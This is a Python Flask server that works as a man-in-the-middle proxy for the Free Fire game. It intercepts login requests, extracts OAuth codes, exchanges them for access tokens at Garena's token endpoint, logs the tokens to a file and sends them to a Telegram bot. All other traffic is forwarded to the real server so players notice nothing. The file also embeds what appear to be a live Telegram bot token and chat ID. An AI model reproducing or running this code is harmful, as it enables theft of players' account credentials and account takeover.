from flask import Flask, request, jsonify, Response
import requests
import os
import json
import re
from datetime import datetime

# Try to import black-apis for protobuf decoding
try:
    from black_apis.freefire import protos
    HAS_PROTO = True
except ImportError:
    HAS_PROTO = False
    print("⚠️ black-apis not installed. Protobuf decoding will use fallback.")

app = Flask(__name__)

# ─── CONFIGURATION ──────────────────────────────────────────────
CLIENT_ID = "100067"
TOKEN_URL = "https://auth.garena.com/oauth/token"
# The redirect_uri must match the one used in the OAuth URL that generated the code.
# The bot uses the official Garena callback, so we'll use the same.
REDIRECT_URI = "https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/"

# Telegram bot (optional) – you can skip if you just want logs
TELEGRAM_TOKEN = os.environ.get('8199355245:AAEXNVzd9lZUv5fvT9axmJ3rNbcSPUh56QA', '')
TELEGRAM_CHAT_ID = os.environ.get('6261108215', '')

# Keep track of active users
active_users = []
# ─────────────────────────────────────────────────────────────────

def send_telegram(msg):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}
        )
    except:
        pass

@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['POST'])
@app.route('/user/<user_id>/<path:subpath>', methods=['POST'])
def capture_token(user_id, subpath):
    # Track user
    if user_id not in active_users:
        active_users.append(user_id)
        print(f"👤 New user: {user_id}")

    print(f"\n🔹 Request from {user_id}, subpath: {subpath}")

    # We only care about GetLoginData (the request containing the OAuth code)
    if subpath == "GetLoginData":
        raw_data = request.get_data()
        print(f"📦 Received {len(raw_data)} bytes")

        # ── Step 1: Extract the OAuth code from the protobuf ──
        oauth_code = None

        if HAS_PROTO:
            try:
                # Use black-apis to parse the protobuf.
                # The exact message type might be 'LoginRequest' or 'GetLoginDataRequest'.
                # We'll try multiple common types.
                from google.protobuf import message
                # Try LoginRequest (common)
                login_req = protos.LoginRequest()
                login_req.ParseFromString(raw_data)
                # Print all fields to see structure
                print(f"📋 Parsed LoginRequest: {login_req}")

                # Attempt to extract code – field names often include 'code'
                for field in login_req.DESCRIPTOR.fields:
                    if 'code' in field.name.lower():
                        oauth_code = getattr(login_req, field.name, None)
                        if oauth_code:
                            print(f"✅ Found code in field '{field.name}': {oauth_code}")
                            break
                if not oauth_code:
                    # If not found, try accessing common attributes directly
                    if hasattr(login_req, 'code'):
                        oauth_code = login_req.code
                    elif hasattr(login_req, 'oauth_code'):
                        oauth_code = login_req.oauth_code
            except Exception as e:
                print(f"❌ Protobuf parsing error: {e}")
                # Fallback to raw search
                oauth_code = None

        # ── Fallback: Search raw bytes for OAuth code pattern ──
        if not oauth_code:
            # OAuth codes are typically 30-50 characters, alphanumeric and sometimes with dashes/underscores
            code_pattern = re.compile(rb'[a-zA-Z0-9_-]{30,50}')
            matches = code_pattern.findall(raw_data)
            if matches:
                # Try each candidate; the OAuth code often starts with '4/' for Google or is alphanumeric
                for candidate in matches:
                    candidate_str = candidate.decode('utf-8', errors='ignore')
                    # Filter out common false positives
                    if len(candidate_str) > 30 and not candidate_str.isdigit():
                        oauth_code = candidate_str
                        print(f"🔍 Found code via regex: {oauth_code}")
                        break

        if oauth_code:
            print(f"✅ OAuth Code extracted: {oauth_code[:20]}...")

            # ── Step 2: Exchange the code for tokens ──
            payload = {
                "grant_type": "authorization_code",
                "code": oauth_code,
                "client_id": CLIENT_ID,
                "redirect_uri": REDIRECT_URI
            }

            try:
                resp = requests.post(TOKEN_URL, data=payload, timeout=10)
                token_data = resp.json()
                print(f"📬 Exchange response: {token_data}")

                hex_token = token_data.get('access_token')
                jwt_token = token_data.get('token')  # JWT (optional)

                if hex_token:
                    print(f"🎯 HEX ACCESS TOKEN: {hex_token}")
                    # Send to Telegram if configured
                    send_telegram(
                        f"🎯 <b>Hex Token Captured!</b>\n"
                        f"User: {user_id}\n"
                        f"Token: <code>{hex_token}</code>"
                    )
                    # Also store in a file or database
                    with open("tokens.txt", "a") as f:
                        f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")
                else:
                    print("⚠️ No hex token in exchange response.")
                    # Maybe the exchange requires a different client_id or secret.
                    # Try alternative exchange endpoint?
            except Exception as e:
                print(f"❌ Exchange error: {e}")
        else:
            print("⚠️ No OAuth code found in request.")

        # ── Step 3: Return success to the game ──
        # The game expects a simple JSON response.
        return jsonify({"status": "success", "message": "OK"}), 200

    else:
        # For other endpoints (Ping, etc.), just forward to Garena's real server
        # so the game works normally.
        return forward_to_garena(user_id, subpath)

def forward_to_garena(user_id, subpath):
    """Forward request to the real Garena server."""
    real_server = "https://client.ind.freefiremobile.com"
    real_url = f"{real_server}/{subpath}" if subpath else real_server
    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
    headers.pop('Content-Length', None)
    headers['Host'] = 'client.ind.freefiremobile.com'
    try:
        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
        excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        resp_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]
        return Response(resp.content, status=resp.status_code, headers=resp_headers)
    except Exception as e:
        print(f"Forward error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def admin():
    return jsonify({
        "active_users": active_users,
        "message": "FF Token API running"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)